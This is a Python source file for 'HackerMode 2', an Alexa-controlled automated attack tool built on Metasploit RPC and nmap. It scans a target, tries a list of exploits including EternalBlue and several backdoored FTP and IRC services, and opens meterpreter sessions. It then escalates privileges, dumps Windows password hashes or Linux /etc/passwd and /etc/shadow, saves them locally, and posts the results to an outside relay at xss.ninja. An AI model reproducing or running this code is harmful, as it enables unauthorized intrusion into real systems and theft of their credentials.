#!/usr/bin/env python
#   HackerMode 2 Auto pwn for Kali and pymetasploit and msfrpcd
#   Copyright (C) 2019 David Cross
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.

def toascii (ustring):
    return unicodedata.normalize('NFKD', ustring).encode('ascii','ignore')

def write_loot_to_downloads(loot,filnam):
    home = os.path.expanduser("~")
    finalpath = os.path.join(home,"Downloads")
    try:
        f = open(finalpath + '/' + filnam,'w+')
        f.write(loot)
        f.close()
    except:
        print("crap file didn't write to")

print('HackerMode 2 "Death Star" Auto pwn for Kali and pymetasploit and msfrpcd')
print('Copyright (C) 2019 David Cross')
print('This program comes with ABSOLUTELY NO WARRANTY.')
print('See <https://www.gnu.org/licenses/gpl-3.0.en.html> for more information.')
print('This program is designed for Kali and Python 2.7 only.')

import sys
import os

def print_no_newline(string):
    #import sys
    sys.stdout.write(string)
    sys.stdout.flush()
    sys.stdout.write('\r')
    sys.stdout.flush()
    
# This function attempts to return the real IP address of the Kali instance so that we know what to set lHost IP to
def myipaddress():
    import socket
    return (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["0.0.0.0"])[0]

try:
    from metasploit.msfrpc import MsfRpcClient
except:
    print("you need to instll pymetapsloit from https://github.com/xssninja/pymetasploit")
    sys.exit(1)

try:
    import nmap
except:
    print("You need to install python nmap from whereveer it is on the net")
    sys.exit(1)

# these libraries should be all installed by default on Kali
import json
import requests
import socket
import sys
import time
import binascii
import pprint
import unicodedata


StopMeNow = False
urlfromAlexa = 'https://xss.ninja/Kali_ReadXA.php'
urltoAlexa = 'https://xss.ninja/Kali2AlexaXA.php'
print ('urlfromAlexa is: ' + urlfromAlexa)
print ('urltoAlexa is: ' + urltoAlexa)
alexaAPIKey = ''
alexaSessionId = ''
#post data is defined here
openports = ''
portscanres =''
exploitres = ''
searchres = ''
usepayloadres = ''
postmodule = ''
shellres = ''
getuidres = ''
winlin = ''
exploit =''
rhost = ''
lhost = ''
payload= ''
rport= '0'
lport = '4000'
exploits = ''
sessions=''
consoles=''
error=''
mstatus=''
sig=''
prettyprint = 0
responsetype = ''
windows = "True" # assume windows until proven otherwise
 

# log into the MSFRPCClient and try to keep it alive during the session (times out in a few min)
# if we can't instantiate it then tell the user why and quit
try:
    cli = MsfRpcClient(username='msf',password ='test',ssl=False, port=55553)   #if need to change the username and password for msfrpc here is where you do it
except:
    print("Could not connect to MsrRPC service with hard-coded user/pass try this in a new terminal> msfrpcd -S -f -U msf -P test")
    sys.exit(1)

SomethingToSend = False

#loop forever
while (StopMeNow == False):
    #write response if any to Alexa first
    # we include everything about the state of the metasploit or scan
    if prettyprint == 0:
        print_no_newline('|')
        time.sleep(1)
    if prettyprint == 1:
        print_no_newline('/')
        time.sleep(1)
    if prettyprint == 2:
        print_no_newline('-')
        time.sleep(1)
    if prettyprint == 3:
        print_no_newline('\\')
        time.sleep(1)
    prettyprint = prettyprint + 1
    if prettyprint == 4:
        prettyprint = 0
        
    # FromKali messag type contains all the vars initted to empty string above:    

    # --------------------------------------------------------------------------------------------
    # Send any data back to Alexa that we have gathered from the collection of possible attributes
    #---------------------------------------------------------------------------------------------
    if SomethingToSend == True:
        if (exploitres != ''):
            exploitres = exploitres.replace("\r","")
            exploitres = exploitres.replace("\n","")
            exploitres = exploitres.replace("[*]","")
            exploitres = exploitres.replace("[]",'""')
            exploitres = exploitres.replace("\\"," slash ")
            getuidres = getuidres.replace("\r","")
            getuidres = getuidres.replace("\n","")
            getuidres = getuidres.replace("\\"," slash ") # do this otherwise NodeJS can't remove the \v or \u000b no matter what replacing/cleaning code you use... which then throws a JSON exception 

            shellres = shellres.replace("\n","")
            shellres = shellres.replace("\r","")
            shellres = shellres.replace("\\"," slash ")
            
            exploitres = exploitres.replace("/"," ")
            exploitres = exploitres.replace("("," ")
            exploitres = exploitres.replace(")"," ")
            #exploitres = exploitres.replace("_"," ")

        cmd = '{"responsetype": "'+ responsetype + '", "openports": ['+ openports +'], "portscanres": "'+  portscanres + '", "exploitres": "'+  exploitres + '", "searchres": "'+  searchres + '", "usepayloadres": "'+  usepayloadres +'", "shellres": "'+  shellres + '", "getuidres": "'+  getuidres + '", "windows": "'+ windows +'", "exploit": "'+ exploit +'", "rhost": "'+ rhost +'", "lhost": "'+ lhost +'", "payload": "'+ payload +'", "rport": "'+ rport +'", "lport": "' + lport +'", "exploits": "' + exploits +'", "sessions": "'+ sessions + '", "postmodule": "'+ postmodule +'", "error": "'+  error +'", "mstatus": "'+ mstatus +'"}'
        cmd2 = cmd.replace('\n>','')
        sig = 'sig=somesignature'
        print "!!!built cmd... sending to Alexa...\n"

        print cmd2
        outpayload = {'cmd': cmd2, 'sig': sig}
        print "about to send payload: " + json.dumps(payload)
        
        try: 
            r = requests.post(urltoAlexa, data=outpayload)
            #data=json.dumps(outpayload))
            #print "Kali2Alexa> " + payload.to##### string??
            print "Response> " + binascii.hexlify(r.text)   
            if r.text != '':
                print r.text
            SomethingToSend = False
        except requests.exceptions.RequestException as e:
            print "Kali2Alexa> call failed..." + e
    #--------------------------------------------------------------------------------------------  
    # Read any commands from Alexa and act on the event/command type
    #--------------------------------------------------------------------------------------------
    # command|{json body}|sig=blahblah
    try:
        r = requests.get(urlfromAlexa)
        #print("Requesting from Alexa queue at " + urlfromAlexa) 
        r.encoding = "utf-8"
        if r.text == '': continue   #### if the result is an empty response then go to the next iteration of the loop
        # convert back from unicode
        output = r.text
        print(output)
        #
        strsplit = output.split("|")  # r.text.split("|")  # we get: exploit=[{'windows/..':'8000'},{'blah':'909'}...]   and   sig=ca83b9be521e40a2512fc285aa63db7e
        ctemp = strsplit[0].split("=")
        body = ctemp[1] # parse off the payload
        cmd = ctemp[0].lower()  # parse off the command name
        tsig = strsplit[1].split("=") # parse off the signature
        sig = tsig[1].lower()
        #print("<Alexa said>" + body + "</Alexa said>")
        #parse body into a dictionary containing the exploit list and ports for the exploit
        tbody= body.split("=")
        try:
            #asciibod = unicodedata.normalize('NFKD', body).encode('ascii','ignore')
            varz = json.loads(body)
            #dbody= json.loads(tbody[1])
        except:
            print("!!!!!!!failed to JSONIFY the command body into a list of lists!!!!!!")
        
        print ("body = " + body)
        print ("command =" + cmd) 
        print ("sig = " + sig)
        if cmd == 'scan':
            rlist = cmd                                 #r.text.split(",")
        # if cmd == 'exploit':
        #    if (type(varz) is dict):
        #         dbody = [(v,w) for v,w in varz.items()]
        #    if type(dbody) is list:
        #        lbody = dbody
                
        # set cmd to the first item in the list from Alexa

        # ------------------------------------------------
        # Eval whatever command we get from Alexa
        # ------------------------------------------------

        ##### STOP command
        if cmd == 'stop':
            print "Stopping"
            StopMeNow = True

        ##### SCAN command
        if cmd == 'scan':
            #start scan
            # cmd should say scan
            # body should contain the IP to scan
            # sig should contain the hash versus the shared secret and the body
            #******** varz = json.loads(body) **************************************************************
            #varz = json.loads('{"targetip": "192-168-1-17", "scantype": "light"}')  #test
            tip= varz["targetip"]
            print "targetIP = " + tip
            stype= varz["scantype"]
            print "scan type = " + stype
            error = "No open ports"      # if error = "No open ports" then the scan worked but the machine is firewalled.
            rhost = tip.replace("-",".")
            if stype == "light":
                scanports = '6667,8000,1433,1635,1524,445,22,23,8080,21'  #quick ports to hit interesting exploits
            if stype == "medium":
                scanports = '8888,8000,6667,1635,1524,445,22,23,25,53,80,21,110,139,443,8080'
            if stype == "large":
                scanports = '0-35555'
                
            print "Scanning " + rhost + " for ports " + scanports
            nm = nmap.PortScanner()
            # run NMAP scan
            nm.scan(rhost, scanports)
            print nm.command_line()
            openports = ""
            portstatus = ""
            try:
                for protocol in nm[rhost].all_protocols():
                    #print('Protocol : ' + protocol)
                    prt = nm[rhost][protocol].keys()
                    #lport.sort()
                    for port in prt:
                        #print "]port= " + str(port) + " state = " +nm[rhost][protocol][port]['state']
                        if nm[rhost][protocol][port]['state'] == "open":
                            openports += '{"port": "' + str(port) + '", "service": "' + nm[rhost][protocol][port]['product'] + '"},'
                            portstatus += ' port ' + str(port) + ' is running service ' + nm[rhost][protocol][port]['product'] + ' '
                            error = "Success"  # Yay! we found an open port
            except:
                portscanres = 'Unable to scan ' + rhost
                print(portscanres)
                error = "Fail"                # either a program error or the target machine was down
            # openports should contain the ports open
            openports = openports[:-1]  # chop semicolon off of and make a little key value pair string out of it
            print "<o_p_e_n p_o_r_t_s> = " + openports
            portscanres = "can remove this" #nm.csv().replace(",","|")
            if 'Microsoft' in  openports:
                windows = "True"
            else:
                windows = "False"
            if openports <> "":
               print("!Open ports=" + openports)
            else:
               print("!No ports discovered. IP: " + tip + " is not responding to port scan")
            hostname=socket.gethostname()
            #lhost=socket.gethostbyname(hostname)
            lhost = myipaddress()
            print("Your Computer Name is:"+hostname)
            print("Your Computer IP Address is:"+lhost)
            mstatus = "scan complete. I found the following open ports " + portstatus
            responsetype = "portscan" # possible options = {portscanres, exploitres, searchres, usepayloadres, shellres}
            # We set all of these vars and are now setting the Send state to trigger the send to Alexa
            #* openports {  list of ports open }
            #* portscanres " text of the port scan "
            #* windows = T or False
            #* error = error status {'Success' or 'Fail'}
            # mstatus = message returned by error or status update
            # trigger the send on the next loop
            SomethingToSend = True
        
        ##### USE EXPLOIT command executes a singular exploit
        if cmd == 'use exploit':
            #use payload
            print "Setting exploit"
            expl = unicodedata.normalize('NFKD', varz['exploit']).encode('ascii','ignore')
            rport = unicodedata.normalize('NFKD', varz['port']).encode('ascii','ignore')
            #for expl, rport in z.iteritems():
            print("Exploit from Alexa=" + expl +"")
            print(type(expl))
            print("Rport from Alexa=" + rport)
            try:
                ex = cli.modules.use('exploit', expl)    #ex = cli.modules.use('exploit','windows/http/icecast_header')
                print ("Exploit " + expl + " set successfully!")
            except:
                print ("Exploit set to " + expl + " failed! Moving on to next candidate exploit.")
                continue
            # preapre to send payloads back to Alexa and prompt user to pick which one
            payloads = ex.payloads
            if len(payloads) > 0:
                print ("We have payloads!")
                #    error ="Success"
                #    mstatus="Sucess"
                #    payload = payloads
                #trigger the exploit section with varz having only one exploit selected
                cmd == 'exploit'
            else: 
                payload = "None"
                error = "Fail"
                mstatus = "Fail"
                SomethingToSend = True
                continue                # resume the application loop which will have the effect of sending the message back to Alexa of the failure

            
        ##### USE POST-EXPLOIT module command
        if cmd == 'use post-exploit module':
            #use post exploit module
            print "Use post exploit module"

 

        ## !! ### use  E X P L O I Ts command ------------------------->            
        if cmd == 'exploit':
            # varz= json.loads('[{"exploit":"linux/samba/setinfopolicy_heap", "port":"445"},{"exploit":"linux/samba/lsa_transnames_heap", "port":"445"},{"exploit":"linux/telnet/telnet_encrypt_keyid", "port":"23"},{"exploit":"unix/ftp/vsftpd_234_backdoor", "port":"21"},{"exploit":"unix/ftp/proftpd_133c_backdoor", "port":"21"},{"exploit":"unix/irc/unreal_ircd_3281_backdoor", "port":"6667"},{"exploit":"linux/ftp/proftp_sreplace", "port":"21"}, {"exploit":"linux/ftp/proftp_telnet_iac", "port":"21"}, {"exploit":"linux/ssh/ceragon_fibeair_known_privkey", "port":"22"}, {"exploit":"linux/ssh/exagrid_known_privkey", "port":"22"}, {"exploit":"linux/ssh/f5_bigip_known_privkey", "port":"22"}, {"exploit":"linux/ssh/loadbalancerorg_enterprise_known_privkey", "port":"22"}, {"exploit":"linux/ssh/quantum_dxi_known_privkey", "port":"22"}, {"exploit":"linux/ssh/quantum_vmpro_backdoor", "port":"22"}, {"exploit":"linux/ssh/symantec_smg_ssh", "port":"22"}, {"exploit":"unix/ssh/array_vxag_vapv_privkey_privesc", "port":"22"}, {"exploit":"unix/ssh/tectia_passwd_changereq", "port":"22"}]')
            # cmd should say exploit
            # dbody should contain list of exploits to scan with their rport numbers
            # sig should contain the hash versus the shared secret and the body string
            print "Exploit"
            #rhost = rlist[1]
            print("rhost =" + rhost)
            
            # we have already established a connection to MSFCli so go ahead and start looping through exploits and rports
            # loading a list like: '[{"exploit": "windows/http/icecast_header", "port": "8000"},{"exploit": "exploit/windows/smb/ms17_010_eternalblue", "port": "445"}]'
            # loop through each payload until we're done
            for z in varz:
                expl = unicodedata.normalize('NFKD', z['exploit']).encode('ascii','ignore')
                rport = unicodedata.normalize('NFKD', z['port']).encode('ascii','ignore')
                #for expl, rport in z.iteritems():
                print("Exploit from Alexa=" + expl +"")
                print(type(expl))
                print("Rport from Alexa=" + rport)
                try:
                    ex = cli.modules.use('exploit', expl)    #ex = cli.modules.use('exploit','windows/http/icecast_header')
                    print ("Exploit " + expl + " set successfully!")
                except:
                    print ("Exploit set to " + expl + " failed! Moving on to next candidate exploit.")
                    continue
                
                payloads = ex.payloads
                if len(payloads) > 0:
                    print ("We have payloads!")
            
                try:
                    ex['RHOSTS'] = rhost 	# typically '192.168.1.x' MS5 rhost to rhosts!!! can now be set to cidr block 192.168.0.0/24
                except:
                    ex['RHOST'] = rhost
                
                print ('rhost(s)=' + rhost)
                if any("RPORT" in s for s in ex.required):
                    ex['RPORT'] = int(rport) 	
                print ('rport= %i', ex['RPORT'])
                    # ex['VERBOSE']= True
                if any("ConnectTimeout" in s for s in ex.required):
                    ex['ConnectTimeout'] = 10
                    print ("ConnTO=%i", ex['ConnectTimeout'])
                if any("SSLVersion" in s for s in ex.required):
                    ex['SSLVersion'] = 'TLS1.2'
                    print ('SSL ver=' + ex['SSLVersion'])
                if any("LHOST" in s for s in ex.required):
                    ex['LHOST'] = lhost	# 192.168.137.X
                    print ('LHOST is ' + ex['LHOST'])
                if any("LPORT" in s for s in ex.required):
                    if lport == 0: lport = 4000
                    ex['LPORT'] = int(lport) 	# typically 4000
                    print ('LPORT is %i', ex['LPORT'])
                if any("PROCESSINJECT" in s for s in ex.required):
                    ex['PROCESSINJECT'] = 'explorer.exe' 	# typically explorer.exe
                    print ('PROCESSINJECT is ', ex['PROCESSINJECT'])
                if any("TARGETARCHITECTURE" in s for s in ex.required):
                    ex['TARGETARCHITECTURE'] = 'x32' 	# typically explorer.exe
                    print ('TARGETARCHITECTURE is ', ex['TARGETARCHITECTURE'])


                # get input to continue
                #raw_input("Press Enter to start " + expl + ":" + rport)
                #print ("Attempting to print ex to the console:\n")
                #print (ex)
                print ('possible payloads number:')
                print (len(payloads))
                #print (payloads)

                if windows == "True": 
                    print ('Windows')
                    #ex.execute(payload='windows/meterpreter/reverse_tcp')
                    if any('windows/meterpreter/bind_tcp' in p for p in payloads):
                        payload = 'windows/meterpreter/bind_tcp'
                        ex.execute(payload=payload)
                    elif any('windows/x64/meterpreter/bind_tcp' in p for p in payloads):    
                        payload='windows/x64/meterpreter/bind_tcp'
                        ex.execute(payload=payload)
                    else: ex.execute(payload=ex.payloads[2]) # would be generic/shell_bind_tcp
                else: # must be in Linux
                    print('Linux\n')
                    if 'custom' not in ex.payloads[0]:  # in Win payload[0] is usually a custom payload... in lin it's often a regular shell
                        payload = ex.payloads[0] 
                    else:
                        if len(payloads) >= 1: 
                            payload = ex.payloads[1]

                    ex.execute(payload=payload)  # ex.payloads is a list of strings 0 is a basic in linux but payloads[0] in win is custom
                    # most of the time a friendly payload is already selected
                    # and metasploit will rotate through a few in order
                    #ex.execute(payload='linux/x86/meterpreter/reverse_tcp')
                print('Preparing to execute payload: <' + payload + '>\n')
                idstr = ''
                id = 0
                time.sleep(1)
                sys.stdout.flush()
                time.sleep(1)  #wait 3 seconds and try the shell

                print ("Number of sessions=", len(cli.sessions.list))
                #wait patiently for a meterpreter session
                for loop in range(5):
                    time.sleep(2)
                    print (cli.sessions.list)
                    if len (cli.sessions.list) > 0:
                        print ("Got a session after %i seconds", loop +1)
                        break
                #start pwning
                if len (cli.sessions.list) > 0:
                    idstr = next(iter(cli.sessions.list)) #"{1: {'info'" in session_str:
                    id = int(float(idstr)) 
                    error = "Success"
                    exploitres = "Success"
                    mstatus = "exploit successful"
                    sessions = idstr
                    print ("Session id = " + str(id))
                    #sys.stdout.flush() # if we do the flush it kills things, idk why
                else:
                    print ("Exploit failed. Session was not created for " + expl)
                    mstatus = "exploit failed a session was not created at this time"
                    exploitres = "Fail"
                    sessions = ""
                    error = "Fail"
                    continue  #just move on to the next exploit in the dictionary until we run out
                if id > 0:
                    shell = cli.sessions.session(id)
                    if windows == "True":
                        print('sending getuid to Windows')
                        shell.write('getuid\n')  # getuid is Meterpreter specific use whoami
                    else:
                        print('sending id to Linux')
                        shell.write('id\n')
                    time.sleep(0.5)
                    getuidres = shell.read() 
                    print ("You are " + getuidres)               
#                    sys.stdout.flush()
                    exploitres ="success"
                    # if Windows
                    if windows == "True":
                        if 'SYSTEM' not in getuidres:       #if we aren't SYSTEM then try to get system so we can dump hashes
                            shell.write('getsystem\n')
                            shellres = shell.read()    
                            sys.stdout.flush()
                            print ('get  system says: ' + shellres)

                        shell.write('run post/windows/gather/hashdump\n')
                        passdump = shell.read()
                        #wait patiently for a meterpreter session
                        loopcount = 0
                        while ':::\n\n\n' not in passdump:
                            time.sleep(1)
                            passdump += shell.read()
                            #if (datetime.now()-t1).seconds > 8:		## careful here because Alexa times out in 8 seconds!
                            if loopcount > 15 : break
                        print ("Done!\n" + passdump)
                        # save it to a file
                        
                        write_loot_to_downloads(passdump,"winpasswd.txt")
                        # clean it up so Alexa can read it without reading a bunch of numbers and crap
                        exploitres = passdump.replace("\\"," backslash ")
                        exploitres = exploitres.replace("\\n"," ")
                        sessions= "1"
                        postmodule = "hashdump"
                        sys.stdout.flush()
                        shell.write('exit')
                        print ("closed shell")
                    elif windows == "False": # ex it's Linux
                        #shell.write('run post/linux/gather/hashdump\n')
                        shell.write('id\n')
                        shellres = shell.read()
                        sys.stdout.flush()
                        print('id = ' + shellres)

                        print("Getting user accounts on linux console.\n")
                        #shell.write("cat /etc/passwd && cat /etc/shadow && echo '>'\n")
                        shell.write("cat /etc/passwd && echo '>'\n")
                        loopcount = 0
                        passdump = ""
                        while '>' not in passdump:
                            time.sleep(1)
                            passdump += shell.read()
                            if loopcount > 15 : break
                        print ("Done!\n" + passdump)
                        passdump2 = passdump.replace('\n>','')
                        #passdump = shell.read()
                        passdump.rstrip('>')
                        write_loot_to_downloads(passdump,"passwd.txt")

                        shell.write("cat /etc/shadow && echo '>'\n")
                        loopcount = 0
                        shadowdump = ""
                        while '>' not in shadowdump:
                            time.sleep(1)
                            shadowdump += shell.read()
                            if loopcount > 15 : break
                        print ("Done!\n" + shadowdump)
                        
                        #shadowdump = shell.read()
                        shadowdump2 = shadowdump.replace('\n>','')

                        write_loot_to_downloads(shadowdump,"shadow.txt")
                        # handle Unix flavor of user/hash data from the shell

                        sessions= "1"
                        postmodule = "pass and shadow"
                        sys.stdout.flush()
                        shell.write('exit')
                        print ("closed shell")
                        # take the user up to the :x and throw the rest away
                        #syslog:*:14684:0:99999:7:::
                        #klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
                        #exploitres = passdump.replace(",","")
                        #exploitres = exploitres.replace("\\n"," ")
                        exploitres=""
                        shadowdump = shadowdump2.split('\n')
                        for usr in shadowdump:
                            print ("usr=" + usr)
                            er = usr.split(':')
                            print ("er=" + er[0])
                            try:
                                if len(er[1]) > 1: # found a username but not one with a hash
                                    exploitres += toascii(er[0]) + " "
                            except:
                                continue 
                        exploitres = "See your downloads directory for hashes for the users " + exploitres
                        print("Exploitres=" + exploitres)
 

                    #alexa will read out whatever loot is in the exploitres variable, but it must be in a friendly format
                    if passdump != '':
                        mstatus = "I successfully retrieved users and copied them to your Downloads folder."
                    else:
                        mstatus = "I failed to retrieve accounts from the target."
                    responsetype = "exploitres"       #{portscanres, exploitres, searchres, usepayloadres, shellres}

                    SomethingToSend=True
                    break  # (NEW) break out of the look around the full exploit set if we got a shell!
                #else continue
                        
                    #All of these vars should be set now if all went well
                    #& openports {  list of ports open }
                    #& portscanres " text of the port scan "
                    #* exploitres = 
                    #* usepayloadres = result of usepayload
                    #* shellres = result of shell command
                    #* getuidres = result of getuid command
                    #& windows = T or False
                    #& rhost = IP address of remote machine to attack
                    #& rport = remote port for connect back
                    #& payload = payload name for the exploit
                    #& exploits = list of possible exploits for the port
                    #* payloads = list of possible payloads for the exploit
                    #* sessions = list of sessions active
                    #* error = error status
                    #& mstatus = metasploit status or error

#----------------------------------------------------
        if cmd == 'shell command':
            #use shell command
            print "Running shell command "
        
    except requests.exceptions.RequestException as e:
	print(e)
    #try:
    #    print(e.status_code)
    #except:
    #    print("")
#end while
print ('Session Finished')
sys.exit(1)


